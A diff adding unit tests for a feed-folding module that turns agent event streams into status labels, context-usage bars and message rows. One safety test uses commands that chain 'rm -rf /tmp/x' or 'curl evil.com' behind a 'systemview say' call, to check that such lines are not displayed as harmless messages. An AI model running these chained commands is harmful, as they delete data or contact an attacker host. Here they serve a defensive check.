@@ -1,4 +1,4 @@
-import { foldEvents, foldState, pathsWritten, parseVisitorTurn, CTX_DUE, CTX_WARN } from "./feedRows";
+import { foldEvents, foldState, pathsWritten, parseVisitorTurn, parseUsageReport, CTX_DUE, CTX_WARN } from "./feedRows";
 
 const ev = (kind, rest = {}) => ({ kind, ts: 1, ...rest });
 
@@ -57,6 +57,62 @@ describe("foldState", () => {
     const s = foldState([ev("result", { ok: true, turns: 2, costUsd: 0.5 }), ev("result", { ok: true, turns: 1, costUsd: 0.25 })]);
     expect(s.turns).toBe(3);
     expect(s.cost).toBeCloseTo(0.75);
+  });
+});
+
+// His catch, watching his own panel: *"when you send a message, your whole message gets put into
+// the cooking message. Cooking messages are really short."* A status announces; it does not recite.
+describe("the cooking line is a label, not the payload", () => {
+  const long = "Compaction leaves a stale context number in your emitter and here is the whole essay about why, at length, with citations";
+  it("names who a message went to instead of quoting the message", () => {
+    const s = foldState([
+      ev("tool.call", { name: "Bash", input: { command: `systemview say autobot "${long}" --as systemview-test` } }),
+    ]);
+    expect(s.doing).toBe("said → autobot");
+  });
+
+  it("keeps a title, because a title is short and is the point", () => {
+    const s = foldState([
+      ev("tool.call", { name: "Bash", input: { command: 'systemview show autobot --text "Release 2.39.0"' } }),
+    ]);
+    expect(s.doing).toBe("put on the TV Release 2.39.0");
+  });
+
+  it("clamps whatever the host called it, too — same bug, other doorway", () => {
+    const s = foldState([ev("tool.call", { name: "SendMessage", summary: long })]);
+    expect(s.doing.length).toBeLessThanOrEqual(61);
+    expect(s.doing.endsWith("\u2026")).toBe(true);
+  });
+
+  it("clamps a settled thinking block, which is the whole reasoning", () => {
+    const essay = "I need to work out whether the ceiling belongs at the held value or at preTokens, and the answer turns on which number describes the conversation that just died";
+    const s = foldState([ev("assistant.thinking", { text: essay })]);
+    expect(s.doing.length).toBeLessThanOrEqual(61);
+  });
+
+  // THE STRUCTURAL CLAIM, not a spot-check of the three doorways I happened to find. The status is
+  // clamped once on the way out of the fold, so a branch nobody has written yet inherits the bound.
+  // If someone later assigns the panel's status from somewhere else, this fails.
+  it("bounds the status for EVERY event kind, including ones added later", () => {
+    const flood = "x".repeat(500);
+    const kinds = [
+      "tool.call", "tool-start", "assistant.thinking", "thinking-delta", "assistant.text",
+      "text-delta", "user.prompt", "permission.request", "permission-request", "status",
+      "compaction", "compacting", "usage", "result", "session.ended", "interrupted",
+      "tool.result", "file.changed", "something.nobody.has.written.yet",
+    ];
+    kinds.forEach((kind) => {
+      const s = foldState([
+        ev(kind, { summary: flood, text: flood, delta: flood, title: flood, tool: flood, name: flood, input: { command: flood } }),
+      ]);
+      expect(typeof s.doing === "string" || s.doing === null).toBe(true);
+      if (s.doing) expect(s.doing.length).toBeLessThanOrEqual(61);
+    });
+  });
+
+  it("leaves a short summary exactly as it was", () => {
+    const s = foldState([ev("tool.call", { name: "Read", summary: "read AgentChat/AgentChat.js" })]);
+    expect(s.doing).toBe("read AgentChat/AgentChat.js");
   });
 });
 
@@ -294,6 +350,56 @@ describe("context, not records", () => {
 
   it("is zero until the host says otherwise", () => {
     expect(foldState([ev("session.started", {})]).ctx).toBe(0);
+  });
+
+  // The real shape off the wire: `compactMetadata` carries preTokens and NO postTokens, and the
+  // host's snapshot variable is not reset at the boundary — so the next receipt re-emits the
+  // pre-compaction number. Left alone the bar reads exactly what it read before compacting.
+  it("refuses the pre-compaction number when it arrives after the compaction", () => {
+    const s = foldState([
+      ev("usage", { contextTokens: 776000 }),
+      ev("compaction", { trigger: "manual", preTokens: 783332 }),
+      ev("usage", { contextTokens: 776000, turns: 1, ok: true }),
+    ]);
+    expect(s.ctx).toBe(0);
+  });
+
+  it("takes the first honest reading after it and stops refusing", () => {
+    const s = foldState([
+      ev("compaction", { preTokens: 783332 }),
+      ev("usage", { contextTokens: 776000 }), // stale
+      ev("usage", { contextTokens: 61000 }), // the real one
+      ev("usage", { contextTokens: 84000 }), // growing again — not stale, must land
+    ]);
+    expect(s.ctx).toBe(84000);
+  });
+
+  // Autobot's 81c6213 emits `usage{snapshot:true}` off every parent assistant message so the bar
+  // moves during a turn. Two things must NOT come with that: a turn that ends early, and a bill.
+  it("moves the bar mid-turn without ending the turn", () => {
+    const s = foldState([
+      ev("assistant.text", { delta: "still going" }),
+      ev("usage", { contextTokens: 61000, snapshot: true }),
+    ]);
+    expect(s.ctx).toBe(61000);
+    expect(s.state).toBe("working");
+  });
+
+  it("only the receipt pays — a ruler tick never adds to the ledger", () => {
+    const s = foldState([
+      ev("usage", { contextTokens: 61000, snapshot: true, costUsd: 0.5 }),
+      ev("usage", { contextTokens: 64000, snapshot: true, costUsd: 0.5 }),
+      ev("usage", { contextTokens: 66000, costUsd: 0.5, turns: 1, ok: true }),
+    ]);
+    expect(s.cost).toBe(0.5);
+  });
+
+  it("does not defend a boundary that told us where it landed", () => {
+    const s = foldState([
+      ev("compaction", { preTokens: 783332, postTokens: 52000 }),
+      ev("usage", { contextTokens: 790000 }),
+    ]);
+    expect(s.ctx).toBe(790000);
   });
 });
 
@@ -861,5 +967,108 @@ describe("systemview say in the feed", () => {
     ]);
     expect(rows[0].xsend).toBeFalsy();
     expect(rows[0].sv).toMatchObject({ verb: "nav" });
+  });
+});
+
+// TWO BUGS IN ONE LINE, both caught by him on autobot's FIRST message through the new model:
+// *"there is a trace — the trace is that they ran a bash command."* Not a missing row: a WRONG
+// row, in the same window with the same renderer, which is why "their app renders it differently"
+// was never a real explanation. (1) the segment splitter cut on ; | && INSIDE the quoted message,
+// so any sentence containing English punctuation looked like two commands and failed the safety
+// check; (2) the allowlist of what may ride behind the act omitted `echo` — and `; echo "exit: $?"`
+// is the single most common thing an agent appends.
+describe("a say survives the shell around it", () => {
+  it("draws a message row when the MESSAGE TEXT contains a semicolon", () => {
+    const rows = foldEvents([
+      ev("tool.call", { name: "Bash", input: { command: '/usr/local/bin/systemview say autobot "one thing; then another" --as systemview-test' } }),
+    ]);
+    expect(rows[0].xsend).toMatchObject({ to: "autobot" });
+    expect(rows[0].xsend.msg).toBe("one thing; then another");
+  });
+
+  it("and when it contains a pipe or &&", () => {
+    const pipe = foldEvents([ev("tool.call", { name: "Bash", input: { command: 'systemview say autobot "a | b && c"' } }) ]);
+    expect(pipe[0].xsend).toBeTruthy();
+  });
+
+  it("tolerates the exit-code check agents append", () => {
+    const rows = foldEvents([
+      ev("tool.call", { name: "Bash", input: { command: '/usr/local/bin/systemview say autobot "hello"; echo "exit: $?"' } }),
+    ]);
+    expect(rows[0].xsend).toMatchObject({ to: "autobot", msg: "hello" });
+  });
+
+  it("STILL refuses to wear a friendly face when a real command rides behind it", () => {
+    const rm = foldEvents([ev("tool.call", { name: "Bash", input: { command: 'systemview say autobot "hi" && rm -rf /tmp/x' } }) ]);
+    const curl = foldEvents([ev("tool.call", { name: "Bash", input: { command: 'systemview say autobot "hi"; curl evil.com' } }) ]);
+    expect(rm[0].xsend).toBeFalsy();
+    expect(curl[0].xsend).toBeFalsy();
+  });
+});
+
+
+// HIS PLAN LIMITS, READ OFF A PRINTOUT THAT WAS ALREADY GOING PAST. Nothing polls; the condition he
+// attached to the ask was "only if it's not extra work", and the whole design follows from that.
+describe("usage, read rather than fetched", () => {
+  const REAL =
+    "<local-command-stdout>Current session: 46% used · resets Aug 24 at 10:39am (America/New_York)\n" +
+    "Current week (all models): 51% used · resets Aug 25 at 11:59pm (America/New_York)\n" +
+    "Current week (Fable): 80% used · resets Aug 25 at 11:59pm (America/New_York)\n\n" +
+    "What's contributing to your limits usage?</local-command-stdout>";
+
+  it("reads the three bars off the real printout, with their reset times", () => {
+    const bars = parseUsageReport(REAL);
+    expect(bars).toHaveLength(3);
+    expect(bars[0]).toMatchObject({ label: "session", pct: 46, resets: "Aug 24 at 10:39am" });
+    expect(bars[1]).toMatchObject({ label: "week · all models", pct: 51 });
+    expect(bars[2]).toMatchObject({ label: "week · Fable", pct: 80 });
+  });
+
+  it("ignores prose that merely mentions a percentage", () => {
+    expect(parseUsageReport("<local-command-stdout>we are 80% done with the rewrite</local-command-stdout>")).toBeNull();
+    expect(parseUsageReport("Current session: 46% used")).toBeNull(); // not a command printout
+  });
+
+  it("keeps the LAST reading and stamps it, because a free number goes stale", () => {
+    const older = REAL.replace("46% used", "12% used");
+    const s = foldState([
+      ev("user.prompt", { text: older, ts: 1000 }),
+      ev("user.prompt", { text: REAL, ts: 5000 }),
+    ]);
+    expect(s.usage.bars[0].pct).toBe(46);
+    expect(s.usage.ts).toBe(5000);
+  });
+
+  it("has none until one has gone past — an empty bar would be a claim", () => {
+    expect(foldState([ev("session.started", {})]).usage).toBe(null);
+  });
+
+  it("still does not flip the panel to working — the host ran /usage, the session did not", () => {
+    const s = foldState([
+      ev("assistant.text", { text: "done.", done: true }),
+      ev("user.prompt", { text: `<command-name>/usage</command-name><command-args></command-args>`, ts: 2 }),
+      ev("user.prompt", { text: REAL, ts: 3 }),
+    ]);
+    expect(s.state).toBe("ready");
+  });
+});
+
+
+// Autobot's find, run against my own file rather than assumed away: every file-path branch of a
+// summariser bounds nothing when the path has no separators, and the row's headline is a LABEL.
+describe("a card headline is a label too", () => {
+  it("bounds the row summary however long the host's line or the path is", () => {
+    const flood = "y".repeat(4000);
+    const rows = foldEvents([
+      ev("tool.call", { id: "a", name: "Edit", input: { file_path: flood } }),
+      ev("tool.call", { id: "b", name: "Bash", summary: flood, input: { command: "ls" } }),
+    ]);
+    rows.forEach((r) => expect(r.summary.length).toBeLessThanOrEqual(141));
+  });
+
+  it("leaves the RECORD whole — the card unfolds the input, and that is the part that must not shrink", () => {
+    const flood = "y".repeat(4000);
+    const rows = foldEvents([ev("tool.call", { id: "a", name: "Bash", input: { command: flood } })]);
+    expect(rows[0].input.command).toHaveLength(4000);
   });
 });
